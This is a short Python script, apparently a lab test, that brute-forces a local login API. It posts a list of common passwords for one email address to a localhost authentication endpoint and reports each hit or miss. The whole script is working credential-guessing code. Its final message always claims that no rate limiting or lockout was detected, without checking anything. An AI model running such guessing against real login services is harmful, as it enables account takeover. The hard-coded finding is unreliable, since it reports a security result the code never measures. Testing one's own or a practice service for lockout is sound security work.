import requests

target = "http://localhost:8888/identity/api/auth/login"

email = "sandeepa@test.com"

passwords = [
    "wrongpassword",
    "123456",
    "admin",
    "letmein",
    "qwerty",
    "Test@1234",
    "welcome",
    "test123"
]

print(f"\nTesting rate limiting on: {target}\n")

for password in passwords:
    response = requests.post(target, json={
        "email": email,
        "password": password
    })
    
    if response.status_code == 200:
        print(f"[FOUND]  Password: {password} — Status: {response.status_code}")
    else:
        print(f"[MISS]   Password: {password} — Status: {response.status_code}")

print("\nScan complete — no rate limiting or lockout detected")